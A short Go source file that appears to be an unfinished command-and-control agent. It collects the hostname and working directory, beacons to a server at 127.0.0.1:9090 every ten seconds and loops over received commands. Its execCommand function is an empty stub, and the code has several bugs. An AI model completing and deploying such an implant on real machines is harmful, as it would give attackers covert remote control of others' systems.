package main

import (
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"global"
	"helpers"
	"log"
	"net"
	"os"
	"time"
)

var (
	message   = global.Message{}
	heartBeat = 10
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9090"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentID = generateID()
}

func main() {
	log.Println("Execution started")

	for {
		channel := connectionServer()

		defer channel.Close()

		//Sending message to server
		gob.NewEncoder(channel).Encode(message)

		//Receiving message from server
		gob.NewDecoder(channel).Decode(message)

		if messageContainsCommand(message) {
			for i, v := range message.Commands {
				message.Commands[i].Response = execCommand(v.Request)
			}
		}

		time.Sleep(time.Duration(heartBeat) * time.Second)
	}
}

func execCommand(command string) (response string) {

	separateCommand := helpers.CommandsSplit(command)
	baseCommando := separateCommand[0]

	switch baseCommando {
	case "htb":
	default:
		//
	}

	return response
}

func messageContainsCommand(serverMessage global.Message) (contains bool) {
	contains = false
	if len(serverMessage.Commands) > 0 {
		contains = true
	}
	return contains
}

func generateID() string {
	time := time.Now().String()

	hash := md5.New()

	hash.Write([]byte(message.AgentHostname + time))

	return hex.EncodeToString(hash.Sum(nil))
}

func connectionServer() (channel net.Conn) {
	channel, _ = net.Dial("tcp", SERVER+":"+PORT)
	return channel
}
